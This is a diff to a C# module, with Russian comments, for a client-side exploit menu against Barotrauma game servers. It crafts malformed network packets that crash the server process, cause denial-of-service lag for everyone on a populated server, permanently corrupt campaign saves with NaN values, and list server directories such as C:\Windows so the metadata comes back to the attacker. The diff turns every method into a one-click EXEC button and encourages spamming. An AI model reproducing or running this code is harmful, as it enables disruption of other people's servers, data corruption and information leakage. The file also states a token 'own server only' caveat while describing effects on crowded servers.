@@ -1,5 +1,7 @@
 using System;
 using System.Collections.Generic;
+using System.Collections.Immutable;
+using System.Reflection;
 using Barotrauma;
 using Barotrauma.Networking;
 using Microsoft.Xna.Framework;
@@ -7,31 +9,31 @@ using Microsoft.Xna.Framework;
 namespace CSHUB.Modules
 {
     // ============================================================
-    //  SERVER CRASH MENU v2 (волна 595)
-    //  • EXEC-кнопка прямо в каждой строке (где метод автоматизирован)
-    //  • Группы: УБИВАЮТ ПРОЦЕСС / DoS-ЛАГ / ОСОБЫЕ
-    //  • Клик по названию = описание; клик по EXEC = запуск
+    //  SERVER CRASH MENU v3 (волна 596)
+    //  • КНОПКА EXEC У КАЖДОГО метода (включая «ручные» — автоматизированы)
+    //  • Entity-события идут ХИРУРГИЧЕСКИ: ID события берём из
+    //    GameMain.Client.LastSentEntityEventID (публичное зеркало
+    //    серверного счётчика, обновляется сервером сам)
+    //  • DescriptionTag: кнопка СТАВИТ СВОЙСТВО локально — сеттер
+    //    Item.DescriptionTag САМ отправляет ChangeProperty на сервер
+    //    (пользователь подтверждил: сервер умирает мгновенно)
     //
-    //  Классы: [INSTANT] процесс умирает сразу • [CRASHLOOP] умирает
-    //  циклом на след. тик • [DOS] батч-дроп (лаг/десинк, процесс жив)
-    //  • [PERM] нужен перм • [SAVE] порча персистится в сейв
-    //
-    //  НОВОЕ в v2 (волна 595):
-    //  • [DOS] EntityState гигантский msgLength → new byte[1ГБ] → OOM
-    //  • [DOS] SegmentTable кривой указатель (4 байта)
-    //  • [DOS] REQUEST_BACKUP_INDICES = спам сканом ФС сервера
+    //  ПОЧЕМУ «EXEC НИЧЕГО НЕ ДЕЛАЕТ»: броски сервера глотаются
+    //  catch-all'ом МОЛЧА (без вербоз-лога даже в консоль не пишутся).
+    //  На СОЛО-сервере батч-дроп невидим (некому лагать). Эффект DoS
+    //  виден на ЛЮДНОМ сервере = лаг/десинк у всех. Смерть процесса
+    //  = только DescriptionTag и EventManager(с диалогом).
     // ============================================================
     public class ServerCrashMenuModule : CSModuleBase
     {
         public override string Id   => "crash_menu";
         public override string Name => "Crash Menu";
         public override string Description =>
-            "Все краши/DoS сервера из 595 волн.\n\n" +
-            "• EXEC в строке = запуск (где автоматизирован)\n" +
-            "• Клик по названию = описание и условия\n" +
-            "• [INSTANT]/[CRASHLOOP] — смерть процесса\n" +
-            "• [DOS] — лаг/десинк, процесс жив\n" +
-            "• [SAVE] — порча остаётся после рестарта!\n" +
+            "Все краши/DoS из 596 волн. У КАЖДОГО есть EXEC.\n\n" +
+            "• УБИВАЮТ ПРОЦЕСС: DescriptionTag (мгновенно),\n" +
+            "  EventManager option=200 (циклом, нужен диалог)\n" +
+            "• DoS = батч-дроп: СОЛО НЕВИДИМ, на людном = лаг всем\n" +
+            "• Смотри результат в логе сервера (вербоз) или по реакции\n" +
             "• Тестируй ТОЛЬКО на своём сервере!";
 
         public override string Category => "exploit";
@@ -56,35 +58,34 @@ namespace CSHUB.Modules
         {
             public string Title;
             public string Desc;
-            public Func<string> Exec; // null = только справочник
+            public Func<string> Exec;
         }
 
         private static readonly Method[] InstMethods = new Method[]
         {
             new Method
             {
-                Title = "[INSTANT] DescriptionTag — смерть сразу",
+                Title = "[INSTANT] DescriptionTag — СТАВИТ СВОЙСТВО САМ",
                 Desc =
-"★ ПОДТВЕРЖДЕНО ТОБОЙ: сервер умирает МГНОВЕННО.\n\n" +
-"КАК: 1) Открой Property Editor. 2) Любой доступный предмет.\n" +
-"3) Свойство DescriptionTag → впиши любой текст → примени.\n\n" +
-"МЕХАНИКА: сеттер зовёт TextManager.Get(текст) и сразу шлёт\n" +
-"ChangeProperty всем клиентам — вылет за пределами catch-all.\n\n" +
-"УСЛОВИЯ: предмет тебе доступен (свой/рядом).",
-                Exec = null // делается через PropertyEditorModule
+"★ ТВОЙ ПОДТВЕРЖДЁННЫЙ мгновенный краш.\n\n" +
+"КАК: EXEC — модуль найдёт доступный предмет (в руках/\n" +
+"инвентаре/рядом) и выставит DescriptionTag локально. СЕТТЕР\n" +
+"САМ отправит ChangeProperty на сервер (ручной пакет не нужен!).\n\n" +
+"НА СЕРВЕРЕ: сетитель зовёт TextManager.Get + рассылает —\n" +
+"СЕРВЕР ПАДАЕТ СРАЗУ.\n\n" +
+"УСЛОВИЕ: ты в раунде, есть хоть один доступный предмет.",
+                Exec = ExecDescriptionTag
             },
             new Method
             {
                 Title = "[CRASHLOOP] EventManager option=200",
                 Desc =
-"★ КОД-КРАШ (584). Смерть на СЛЕДУЮЩЕМ ТИКЕ после пакета.\n\n" +
-"КАК: жми EXEC. НО работает ТОЛЬКО если активный событийный\n" +
-"диалог (вопрос NPC с вариантами) СЕЙЧАС ТАРГЕТИТ ТЕБЯ.\n\n" +
-"МЕХАНИКА: option=200 > числа опций → throw глотается, НО\n" +
-"SelectedOption=200 остаётся → КАЖДЫЙ КАДР IsFinished/Update\n" +
-"кидают IndexOutOfRange → вокруг игрового цикла catch НЕТ →\n" +
-"процесс dedicated падает.\n\n" +
-"СОЛО: заспавнь событие аутпоста у себя на сервере.",
+"Смерть на СЛЕДУЮЩЕМ ТИКЕ. Работает ТОЛЬКО если активный\n" +
+"событийный диалог (вопрос NPC с вариантами) таргетит ТЕБЯ.\n\n" +
+"МЕХАНИКА: option=200 сохраняется в диалог → каждый кадр\n" +
+"IsFinished кидает IndexOutOfRange → вокруг игрового цикла\n" +
+"catch НЕТ → процесс падает.\n\n" +
+"БЕЗ ДИАЛОГА: пакет просто игнорится (это норм).",
                 Exec = ExecEventManager
             }
         };
@@ -95,82 +96,83 @@ namespace CSHUB.Modules
             {
                 Title = "[DOS] SoldItems: несуществующий префаб",
                 Desc =
-"ЛУЧШИЙ безправный DoS (42): throw НА ВЕРХУ кампейн-чтения\n" +
-"(строка 854) ДО всех перм/проверок.\n\n" +
-"КАК: EXEC. Спам кнопкой = сервер лагает/десинк у всех.\n" +
-"УСЛОВИЕ: кампания на сервере (любая роль).",
+"ЛУЧШИЙ безправный DoS: throw на самом верху кампейн-чтения\n" +
+"(до всех проверок).\n\n" +
+"ЭФФЕКТ: батч-дроп. СОЛО невидим; спамь на ЛЮДНОМ = лаг всем.\n" +
+"УСЛОВИЕ: кампания на сервере.",
                 Exec = ExecSoldPrefab
             },
             new Method
             {
                 Title = "[DOS] EntityState: new byte[1ГБ] (OOM)",
                 Desc =
-"НОВОЕ (27+595). EntityState-событие с msgLength=~1ГБ.\n" +
-"Сервер делает new byte[msgLength] ДО проверки буфера!\n\n" +
-"КАК: EXEC — попытка аллокации 1ГБ из крошечного пакета.\n" +
-"OOM/OutOfRange → батч-дроп + мусор в памяти. Спам = давление\n" +
-"на GC: фризы у всех клиентов.\n\n" +
-"УСЛОВИЕ: ты в раунде (нужен ID существующей entity — берём\n" +
-"своего персонажа), ID события подбирается автоматически.",
+"msgLength=1ГБ в entity-событии → сервер делает new byte[1ГБ]\n" +
+"ДО проверки буфера.\n\n" +
+"ЭФФЕКТ: OOM-попытка/throw + батч-дроп. УСЛОВИЕ: в раунде.",
                 Exec = ExecEntityStateOom
+            },
+            new Method
+            {
+                Title = "[DOS] Inventory: индексы start=0 end=255",
+                Desc =
+"Автоматизировано ХИРУРГИЧЕСКИ: event ID = серверный счётчик+1\n" +
+"(публичное зеркало GameMain.Client.LastSentEntityEventID).\n\n" +
+"Цель: ближайший контейнер. start=0/end=255 → запись за границу\n" +
+"массива receivedItemIds → throw → батч-дроп. УСЛОВИЕ: в раунде\n" +
+"и рядом есть контейнер (ящик/шкаф).",
+                Exec = ExecInventoryOob
             },
             new Method
             {
                 Title = "[DOS] SegmentTable: битый указатель",
                 Desc =
-"НОВОЕ (27). UPDATE_LOBBY с tablePointer=0x7FFFFFFF:\n" +
-"сервер прыгает на 2ГБ вперёд и читает мусор → throw.\n\n" +
-"КАК: EXEC — 4 байта и пакет готов. Батч-дроп, спам = лаг.\n" +
-"УСЛОВИЙ НЕТ (даже из лобби).",
+"UPDATE_LOBBY + tablePointer=2ГБ → сервер читает таблицу\n" +
+"сегментов за пределами буфера → throw. 4 байта.\n\n" +
+"ЭФФЕКТ: батч-дроп. БЕЗ условий (даже из лобби).",
                 Exec = ExecSegmentTable
             },
             new Method
             {
                 Title = "[DOS] CircuitBox: левый opcode",
                 Desc =
-"(26). Прямой CIRCUITBOX-пакет с Opcode=AddComponent —\n" +
-"ваниль так не шлёт → switch бросит ArgumentOutOfRange.\n\n" +
-"КАК: EXEC. УСЛОВИЙ НЕТ.",
+"Прямой CIRCUITBOX-пакет с Opcode=AddComponent — ваниль так\n" +
+"не шлёт → switch бросит ArgumentOutOfRange.\n\n" +
+"ЭФФЕКТ: батч-дроп. БЕЗ условий.",
                 Exec = ExecCircuitBox
             },
             new Method
             {
                 Title = "[DOS] Чат: несуществующий ордер",
                 Desc =
-"(30). ORDER-чат с неизвестным id ордера → throw на\n" +
-"OrderPrefab.Prefabs[id] ДО спам/перм-чеков.\n\n" +
-"КАК: EXEC. ★ РАБОТАЕТ ИЗ ЛОББИ. УСЛОВИЙ НЕТ.",
+"ORDER-чат с неизвестным id → throw на OrderPrefab.Prefabs[id]\n" +
+"до спам/перм-чеков. (Ширины enum теперь считаются рантайм.)\n\n" +
+"ЭФФЕКТ: батч-дроп. БЕЗ условий, работает ИЗ ЛОББИ.",
                 Exec = ExecChatOrder
             },
             new Method
             {
                 Title = "[DOS] CharacterInput: count=255",
                 Desc =
-"(35). Инпут-пакет: заявлено 255 инпутов, данных нет →\n" +
-"OOB-чтение за краем пакета → батч-дроп.\n\n" +
-"КАК: EXEC. УСЛОВИЕ: ты в раунде с персонажем.",
+"Инпут-пакет: 255 инпутов заявлено, данных нет → OOB-чтение.\n\n" +
+"ЭФФЕКТ: батч-дроп. УСЛОВИЕ: в раунде с персонажем.",
                 Exec = ExecCharInput
             },
             new Method
             {
                 Title = "[DOS] VOIP: пустые буферы",
                 Desc =
-"(28/451). Заявлено 8 буферов по 255 байт, данных 0 →\n" +
-"BlockCopy за краем → батч-дроп. (451: 1 байт TOC →\n" +
-"OpusException → дроп тика VOIP.)\n\n" +
-"КАК: EXEC. УСЛОВИЕ: голос включён, ты не в муте.",
+"8 буферов по 255 байт заявлено, данных 0 → BlockCopy за краем.\n\n" +
+"ЭФФЕКТ: батч-дроп. УСЛОВИЕ: голос включён, не в муте.",
                 Exec = ExecVoip
             },
             new Method
             {
-                Title = "[DOS] Backup Indices: спам сканом ФС",
+                Title = "[DOS] Backup Indices: скан ФС сервера",
                 Desc =
-"(26). REQUEST_BACKUP_INDICES БЕЗ прав и лимитов:\n" +
-"сервер сканирует ЛЮБУЮ папку по твоему пути и парсит\n" +
-"найденные бэкапы (декомпрессия!).\n\n" +
-"КАК: EXEC шлёт путь корня диска — сервер листает каталог.\n" +
-"Спам = IO/CPU нагрузка + утечка метаданных тебе в ответ.\n" +
-"УСЛОВИЙ НЕТ.",
+"REQUEST_BACKUP_INDICES с путём — сервер листает ЛЮБОЙ каталог\n" +
+"без прав/лимитов. Ответ с метаданными приходит ТЕБЕ.\n\n" +
+"ЭФФЕКТ: спам = IO-нагрузка + инфо-утечка (ответ виден в\n" +
+"дампе). БЕЗ условий.",
                 Exec = ExecBackupScan
             }
         };
@@ -179,48 +181,35 @@ namespace CSHUB.Modules
         {
             new Method
             {
-                Title = "[PERM-DOS] SelectMode: modeIndex OOB",
+                Title = "[SAVE] CircuitBox: NaN в позицию узла",
                 Desc =
-"(41). SERVER_COMMAND(SelectMode) + u16 9999 →\n" +
-"GameModes[9999] → IndexOutOfRange.\n\n" +
-"НУЖЕН РЕАЛЬНЫЙ ПЕРМ SelectMode (permless-сервер его НЕ даёт\n" +
-"— AnyOneAllowed не трогает HasPermission). Кнопки нет:\n" +
-"пакет = SERVER_COMMAND + u16 0x20 + u16 9999.",
-                Exec = null
+"MoveComponent с MoveAmount=NaN: сохраняется в состоянии цепи\n" +
+"и ПЕРСИСТИТСЯ В СЕЙВ кампании → глюки/краши после рестарта.\n\n" +
+"EXEC: хирургический entity-пакет на ближайший circuit box.\n" +
+"Персист сработает если ID узла угадан (берём первый известный\n" +
+"клиенту). ★ ТОЛЬКО НА СВОЕЙ ТЕСТ-КАМПАНИИ!",
+                Exec = ExecCircuitBoxNaN
             },
             new Method
             {
-                Title = "[DOS] Inventory: индексы OOB",
+                Title = "[PERM-DOS] SelectMode: modeIndex 9999",
                 Desc =
-"(26). InventoryState-эвент контейнера: байты start/end без\n" +
-"клампа → receivedItemIds[i] за границей → батч-дроп.\n\n" +
-"Кнопки нет (нужен entity-event канал с подбором ID события —\n" +
-"как у EntityState, но с кривым Inventory-телем). Ручками через\n" +
-"PacketDump/фазер.",
-                Exec = null
+"SERVER_COMMAND(SelectMode) + u16 9999 → GameModes[9999] →\n" +
+"IndexOutOfRange.\n\n" +
+"НУЖЕН ПЕРМ SelectMode. Без перма сервер просто напишет\n" +
+"«Permission denied» в свой лог (безвредно — кнопка для\n" +
+"перми-серверов и своего).",
+                Exec = ExecSelectMode
             },
             new Method
             {
-                Title = "[SAVE] CircuitBox MoveComponent NaN",
+                Title = "[WINDOW] LoadCampaign: мусорный файл",
                 Desc =
-"(523). MoveAmount = raw Vector2 персистится В СЕЙВ.\n" +
-"NaN в позициях компонентов цепи → глюки/краши ЗАГРУЗКИ\n" +
-"кампании после рестарта сервера.\n\n" +
-"★ ОСТОРОЖНО: НЕОБРАТИМО портит сохранение. Только на\n" +
-"своей тест-кампании! Путь: entity-событие CircuitBox\n" +
-"(через PropertyEditor/CircuitBox UI на своём сервере).",
-                Exec = null
-            },
-            new Method
-            {
-                Title = "[PERM] LoadCampaign: мусорный файл",
-                Desc =
-"(586). CAMPAIGN_SETUP_INFO isNew=false: путь сейва — строка\n" +
-"клиента (за пермом ManageRound/окном). Скормить серверу мусорный\n" +
-"файл = парс-исключения при загрузке кампании (возможен жёсткий\n" +
-"фейл старта).\n\n" +
-"НУЖНО ОКНО 586 (админ мёртв/лобби/permless). Кнопки нет.",
-                Exec = null
+"CAMPAIGN_SETUP_INFO(isNew=false) с путём C:\\garbage.save.\n" +
+"В окне 586 (админ мёртв/лобби/permless/солo) сервер попробует\n" +
+"грузить мусор → парс-исключения/фейл кампании.\n\n" +
+"Без окна: сервер молча игнорит (безвредно).",
+                Exec = ExecLoadGarbage
             }
         };
 
@@ -236,7 +225,7 @@ namespace CSHUB.Modules
         {
             try
             {
-                _window = new GUIMessageBox("Server Crash Menu v2", "", Array.Empty<LocalizedString>(), new Vector2(0.8f, 0.92f));
+                _window = new GUIMessageBox("Server Crash Menu v3", "", Array.Empty<LocalizedString>(), new Vector2(0.8f, 0.92f));
                 var content = _window.Content;
                 content.ClearChildren();
 
@@ -245,17 +234,15 @@ namespace CSHUB.Modules
 
                 AddGroupHeader("☠ УБИВАЮТ ПРОЦЕСС СЕРВЕРА", InstColor);
                 AddMethods(InstMethods);
-
-                AddGroupHeader("⚠ DoS — ЛАГ / ДЕСИНК (процесс жив)", DosColor);
+                AddGroupHeader("⚠ DoS — ЛАГ/ДЕСИНК (на соло невидим!)", DosColor);
                 AddMethods(DosMethods);
-
-                AddGroupHeader("🔧 ОСОБЫЕ (перм / сейв / ручные)", PermColor);
+                AddGroupHeader("🔧 ОСОБЫЕ", PermColor);
                 AddMethods(SpecialMethods);
 
                 _desc = new GUITextBlock(
                     new RectTransform(new Vector2(1f, 0.43f), content.RectTransform, Anchor.BottomCenter)
                         { RelativeOffset = new Vector2(0f, 0.075f) },
-                    "Клик по НАЗВАНИЮ = описание. Клик по EXEC = запуск.", textAlignment: Alignment.CenterLeft);
+                    "У КАЖДОГО метода есть EXEC. Клик по названию = описание.", textAlignment: Alignment.CenterLeft);
                 _desc.TextColor = AccentColor;
                 _desc.CanBeFocused = false;
                 try { _desc.Wrap = true; } catch { }
@@ -296,33 +283,17 @@ namespace CSHUB.Modules
                     new RectTransform(new Vector2(1f, 0.085f), _list.Content.RectTransform), style: null);
                 row.Color = RowColor;
                 var layout = new GUILayoutGroup(
-                    new RectTransform(new Vector2(0.99f, 1f), row.RectTransform, Anchor.Center), isHorizontal: true);
+                    new RectTransform(new Vector2(0.985f, 0.92f), row.RectTransform, Anchor.Center), isHorizontal: true);
+                try { layout.RelativeSpacing = 0.008f; } catch { }
 
-                bool hasExec = mm.Exec != null;
-                if (hasExec)
-                {
-                    var execBtn = new GUIButton(
-                        new RectTransform(new Vector2(0.13f, 1f), layout.RectTransform), "EXEC ▶");
-                    execBtn.Color = SelColor;
-                    execBtn.OnClicked = (b, d) =>
-                    {
-                        ShowDesc(mm);
-                        RunExec(mm);
-                        return true;
-                    };
-                }
-                else
-                {
-                    var noExec = new GUITextBlock(
-                        new RectTransform(new Vector2(0.13f, 1f), layout.RectTransform), "—",
-                        textAlignment: Alignment.Center);
-                    noExec.TextColor = new Color(90, 100, 120);
-                    noExec.CanBeFocused = false;
-                }
+                var execBtn = new GUIButton(
+                    new RectTransform(new Vector2(0.14f, 0.9f), layout.RectTransform), "EXEC ▶");
+                execBtn.Color = SelColor;
+                execBtn.OnClicked = (b, d) => { ShowDesc(mm); RunExec(mm); return true; };
 
                 var nameBtn = new GUIButton(
-                    new RectTransform(new Vector2(0.87f, 1f), layout.RectTransform),
-                    hasExec ? mm.Title : mm.Title + "   (без кнопки)");
+                    new RectTransform(new Vector2(0.85f, 0.9f), layout.RectTransform),
+                    mm.Title, textAlignment: Alignment.CenterLeft);
                 nameBtn.OnClicked = (b, d) => { ShowDesc(mm); return true; };
 
                 AddSpacer();
@@ -338,7 +309,6 @@ namespace CSHUB.Modules
 
         private static void RunExec(Method m)
         {
-            if (m.Exec == null) { return; }
             try
             {
                 string result = m.Exec();
@@ -353,42 +323,136 @@ namespace CSHUB.Modules
         // ========================================================
         //  ХЕЛПЕРЫ
         // ========================================================
-        private static bool CanSend()
+        private static bool CanSend() { return GameMain.Client?.ClientPeer != null; }
+        private static bool InRound() { return GameMain.Client.GameStarted && Character.Controlled != null; }
+
+        private static ushort NextEventId()
         {
-            return GameMain.Client?.ClientPeer != null;
+            // Публичное зеркало серверного счётчика: сервер сам присылает его клиенту
+            try { return (ushort)(GameMain.Client.LastSentEntityEventID + 1); }
+            catch { return 0; }
         }
 
-        private static ushort CurrentLocIndex()
+        private static Item FindAccessibleItem()
         {
+            Character me = Character.Controlled;
+            if (me == null) { return null; }
             try
             {
-                var map = GameMain.GameSession?.Campaign?.Map;
-                if (map?.CurrentLocation != null)
+                foreach (Item it in me.HeldItems) { if (it != null && !it.Removed) { return it; } }
+                if (me.Inventory != null)
                 {
-                    int idx = map.Locations.IndexOf(map.CurrentLocation);
-                    if (idx >= 0) { return (ushort)idx; }
+                    foreach (Item it in me.Inventory.AllItemsMod) { if (it != null && !it.Removed) { return it; } }
                 }
             }
             catch { }
-            return 0;
+            Item best = null; float bestD = 300f;
+            foreach (Item it in Item.ItemList)
+            {
+                if (it == null || it.Removed) { continue; }
+                float d = Vector2.Distance(it.WorldPosition, me.WorldPosition);
+                if (d < bestD) { bestD = d; best = it; }
+            }
+            return best;
+        }
+
+        private static Item FindContainer()
+        {
+            Character me = Character.Controlled;
+            if (me == null) { return null; }
+            Item best = null; float bestD = 400f;
+            foreach (Item it in Item.ItemList)
+            {
+                if (it == null || it.Removed) { continue; }
+                bool isContainer = false;
+                try { isContainer = it.GetComponent<ItemContainer>() != null; } catch { }
+                if (!isContainer) { continue; }
+                float d = Vector2.Distance(it.WorldPosition, me.WorldPosition);
+                if (d < bestD) { bestD = d; best = it; }
+            }
+            return best;
+        }
+
+        private static Item FindCircuitBox()
+        {
+            Character me = Character.Controlled;
+            if (me == null) { return null; }
+            Item best = null; float bestD = 500f;
+            foreach (Item it in Item.ItemList)
+            {
+                if (it == null || it.Removed) { continue; }
+                bool isCb = false;
+                try { isCb = it.GetComponent<CircuitBox>() != null; } catch { }
+                if (!isCb) { continue; }
+                float d = Vector2.Distance(it.WorldPosition, me.WorldPosition);
+                if (d < bestD) { bestD = d; best = it; }
+            }
+            return best;
+        }
+
+        // Хирургический entity-пакет: event ID = серверный счётчик+1
+        private static string SendEntityEventRaw(ushort entityId, IWriteMessage payload)
+        {
+            IWriteMessage body = new WriteOnlyMessage();
+            body.WriteUInt16(0);                                   // characterStateID=0 → парсить сразу
+            body.WriteBytes(payload.Buffer, 0, payload.LengthBytes);
+
+            IWriteMessage msg = new WriteOnlyMessage();
+            msg.WriteByte((byte)ClientPacketHeader.UPDATE_INGAME);
+            msg.WriteBoolean(true);
+            msg.WritePadBits();
+            using (var segmentTable = SegmentTableWriter<ClientNetSegment>.StartWriting(msg))
+            {
+                segmentTable.StartNewSegment(ClientNetSegment.EntityState);
+                msg.WritePadBits();
+                msg.WriteUInt16(NextEventId());
+                msg.WriteByte(1);
+                msg.WriteUInt16(entityId);
+                msg.WriteVariableUInt32((uint)body.LengthBytes);
+                msg.WriteBytes(body.Buffer, 0, body.LengthBytes);
+            }
+            GameMain.Client.ClientPeer.Send(msg, DeliveryMethod.Reliable);
+            return "ок (entity " + entityId + ")";
         }
 
         // ========================================================
-        //  [CRASHLOOP] EVENTMANAGER option=200 (584)
+        //  [INSTANT] DescriptionTag
+        // ========================================================
+        private static string ExecDescriptionTag()
+        {
+            if (!CanSend()) { return "нет подключения"; }
+            if (!InRound()) { return "нужно быть в раунде с персонажем"; }
+            Item target = FindAccessibleItem();
+            if (target == null) { return "доступный предмет не найден"; }
+            try
+            {
+                // Сеттер САМ шлёт ChangeProperty на сервер — сервер падает
+                target.DescriptionTag = "zzz_crash_tag_test";
+                return "DescriptionTag выставлен на «" + target.Name + "» (ID " + target.ID +
+                       "). Сеттер отправил событие — сервер должен умереть СРАЗУ.";
+            }
+            catch (Exception e)
+            {
+                return "setter fail: " + e.Message;
+            }
+        }
+
+        // ========================================================
+        //  [CRASHLOOP] EVENTMANAGER
         // ========================================================
         private static string ExecEventManager()
         {
             if (!CanSend()) { return "нет подключения"; }
             IWriteMessage msg = new WriteOnlyMessage();
             msg.WriteByte((byte)ClientPacketHeader.EVENTMANAGER_RESPONSE);
-            msg.WriteUInt16(0x7FFF);   // actionId
-            msg.WriteByte(200);        // option >> Options.Count
+            msg.WriteUInt16(0x7FFF);
+            msg.WriteByte(200);
             GameMain.Client.ClientPeer.Send(msg, DeliveryMethod.Reliable);
-            return "EVENTMANAGER отправлен. Сработает только при активном диалоге на тебя!";
+            return "EVENTMANAGER отправлен (сработает только при активном диалоге на тебя)";
         }
 
         // ========================================================
-        //  [DOS] SoldItems unknown prefab (42)
+        //  [DOS] SoldItems unknown prefab
         // ========================================================
         private static string ExecSoldPrefab()
         {
@@ -407,9 +471,9 @@ namespace CSHUB.Modules
             msg.WriteByte(0);
             msg.WriteByte(0);
             msg.WriteByte(0);
-            msg.WriteByte(1);                                            // 1 store
+            msg.WriteByte(1);
             msg.WriteIdentifier("a".ToIdentifier());
-            msg.WriteUInt16(1);                                          // 1 item
+            msg.WriteUInt16(1);
             msg.WriteIdentifier("zzz_nonexistent_prefab".ToIdentifier());
             msg.WriteUInt16(0);
             msg.WriteBoolean(false);
@@ -418,17 +482,16 @@ namespace CSHUB.Modules
             msg.WriteUInt16(0);
             msg.WriteUInt16(0);
             GameMain.Client.ClientPeer.Send(msg, DeliveryMethod.Reliable);
-            return "SoldItems-bomb ушла (throw на 854 строке, до всех проверок)";
+            return "SoldItems-бомба ушла";
         }
 
         // ========================================================
-        //  [DOS] EntityState giant msgLength → OOM (27/595)
+        //  [DOS] EntityState OOM
         // ========================================================
         private static string ExecEntityStateOom()
         {
             if (!CanSend()) { return "нет подключения"; }
-            if (!GameMain.Client.GameStarted || Character.Controlled == null)
-            { return "нужно быть в раунде с персонажем"; }
+            if (!InRound()) { return "нужно быть в раунде с персонажем"; }
             ushort myId = Character.Controlled.ID;
 
             IWriteMessage msg = new WriteOnlyMessage();
@@ -439,34 +502,56 @@ namespace CSHUB.Modules
             {
                 segmentTable.StartNewSegment(ClientNetSegment.EntityState);
                 msg.WritePadBits();
-                msg.WriteUInt16(0);                    // firstEventID (подберётся ретраями)
-                msg.WriteByte(1);                      // eventCount
-                msg.WriteUInt16(myId);                 // entityID = мой персонаж (IClientSerializable)
-                msg.WriteVariableUInt32(0x40000000u);  // msgLength = 1 ГБ!
-                msg.WriteUInt16(0);                    // characterStateID
-                // данных нет — сервер сделает new byte[1ГБ] ДО проверки буфера
+                msg.WriteUInt16(NextEventId());
+                msg.WriteByte(1);
+                msg.WriteUInt16(myId);
+                msg.WriteVariableUInt32(0x40000000u);
+                msg.WriteUInt16(0);
             }
             GameMain.Client.ClientPeer.Send(msg, DeliveryMethod.Reliable);
-            return "OOM-бомба ушла (попытка new byte[1ГБ] на сервере). Спамить для давления на GC.";
+            return "OOM-бомба ушла (new byte[1ГБ] на сервере)";
         }
 
         // ========================================================
-        //  [DOS] SegmentTable corrupt pointer (27/595)
+        //  [DOS] Inventory start=0 end=255 (хирургический)
+        // ========================================================
+        private static string ExecInventoryOob()
+        {
+            if (!CanSend()) { return "нет подключения"; }
+            if (!InRound()) { return "нужно быть в раунде с персонажем"; }
+            Item container = FindContainer();
+            if (container == null) { return "рядом нет контейнера (ящик/шкаф)"; }
+
+            IWriteMessage payload = new WriteOnlyMessage();
+            payload.WriteRangedInteger(1, 0, 12);                       // EventType.InventoryState
+            int comps = 1;
+            try { comps = Math.Max(1, container.Components.Count); } catch { }
+            payload.WriteRangedInteger(0, 0, comps - 1);                // containerIndex
+            payload.WriteByte(0);                                       // start
+            payload.WriteByte(255);                                     // end → за capacity
+            for (int i = 0; i < 96; i++) { payload.WriteByte(0); }      // 6-битные itemCount=0
+
+            SendEntityEventRaw(container.ID, payload);
+            return "Inventory-бомба ушла на «" + container.Name + "» (start=0 end=255 → запись за границу)";
+        }
+
+        // ========================================================
+        //  [DOS] SegmentTable
         // ========================================================
         private static string ExecSegmentTable()
         {
             if (!CanSend()) { return "нет подключения"; }
             IWriteMessage msg = new WriteOnlyMessage();
             msg.WriteByte((byte)ClientPacketHeader.UPDATE_LOBBY);
-            msg.WriteInt32(int.MaxValue);              // tablePointer = 2ГБ вперёд
+            msg.WriteInt32(int.MaxValue);
             msg.WriteUInt16(0);
             msg.WriteUInt16(0);
             GameMain.Client.ClientPeer.Send(msg, DeliveryMethod.Reliable);
-            return "SegmentTable-бомба ушла (чтение таблицы за пределами буфера)";
+            return "SegmentTable-бомба ушла";
         }
 
         // ========================================================
-        //  [DOS] CircuitBox bad opcode (26)
+        //  [DOS] CircuitBox bad opcode
         // ========================================================
         private static string ExecCircuitBox()
         {
@@ -480,36 +565,37 @@ namespace CSHUB.Modules
         }
 
         // ========================================================
-        //  [DOS] Chat unknown order (30)
+        //  [DOS] Chat unknown order (enum widths runtime)
         // ========================================================
         private static string ExecChatOrder()
         {
             if (!CanSend()) { return "нет подключения"; }
+            int typeMax = Enum.GetValues(typeof(ChatMessageType)).Length - 1;
+            int modeMax = Enum.GetValues(typeof(ChatMode)).Length - 1;
             IWriteMessage msg = new WriteOnlyMessage();
             msg.WriteByte((byte)ClientPacketHeader.UPDATE_LOBBY);
             using (var segmentTable = SegmentTableWriter<ClientNetSegment>.StartWriting(msg))
             {
                 segmentTable.StartNewSegment(ClientNetSegment.ChatMessage);
                 msg.WriteUInt16(1);
-                msg.WriteRangedInteger((int)ChatMessageType.Order, 0, 12);
-                msg.WriteRangedInteger((int)ChatMode.None, 0, 2);
+                msg.WriteRangedInteger((int)ChatMessageType.Order, 0, typeMax);
+                msg.WriteRangedInteger((int)ChatMode.None, 0, modeMax);
                 msg.WriteIdentifier("zzz_nonexistent_order".ToIdentifier());
                 msg.WriteUInt16(0);
                 msg.WriteUInt16(0);
                 msg.WriteByte(0);
             }
             GameMain.Client.ClientPeer.Send(msg, DeliveryMethod.Reliable);
-            return "ORDER-бомба ушла (работает из лобби!)";
+            return "ORDER-бомба ушла (из лобби тоже)";
         }
 
         // ========================================================
-        //  [DOS] CharacterInput count=255 (35)
+        //  [DOS] CharacterInput count=255
         // ========================================================
         private static string ExecCharInput()
         {
             if (!CanSend()) { return "нет подключения"; }
-            if (!GameMain.Client.GameStarted || Character.Controlled == null)
-            { return "нужно быть в раунде с персонажем"; }
+            if (!InRound()) { return "нужно быть в раунде с персонажем"; }
             IWriteMessage msg = new WriteOnlyMessage();
             msg.WriteByte((byte)ClientPacketHeader.UPDATE_INGAME);
             msg.WriteBoolean(true);
@@ -518,14 +604,14 @@ namespace CSHUB.Modules
             {
                 segmentTable.StartNewSegment(ClientNetSegment.CharacterInput);
                 msg.WriteUInt16(1);
-                msg.WriteByte(255);                    // 255 инпутов, данных нет
+                msg.WriteByte(255);
             }
             GameMain.Client.ClientPeer.Send(msg, DeliveryMethod.Reliable);
             return "Input-бомба ушла";
         }
 
         // ========================================================
-        //  [DOS] VOIP empty buffers (28/451)
+        //  [DOS] VOIP
         // ========================================================
         private static string ExecVoip()
         {
@@ -541,16 +627,121 @@ namespace CSHUB.Modules
         }
 
         // ========================================================
-        //  [DOS] REQUEST_BACKUP_INDICES filesystem scan (26/595)
+        //  [DOS] Backup scan
         // ========================================================
         private static string ExecBackupScan()
         {
             if (!CanSend()) { return "нет подключения"; }
             IWriteMessage msg = new WriteOnlyMessage();
             msg.WriteByte((byte)ClientPacketHeader.REQUEST_BACKUP_INDICES);
-            msg.WriteString("C:\\Windows");           // сервер листает каталог
+            msg.WriteString("C:\\Windows");
             GameMain.Client.ClientPeer.Send(msg, DeliveryMethod.Reliable);
-            return "Скан ФС отправлен (сервер листает C:\\Windows). Спамить = IO-нагрузка. Ответ = метаданные тебе.";
+            return "Скан ФС отправлен (C:\\Windows) — сервер листает каталог и шлёт метаданные тебе";
+        }
+
+        // ========================================================
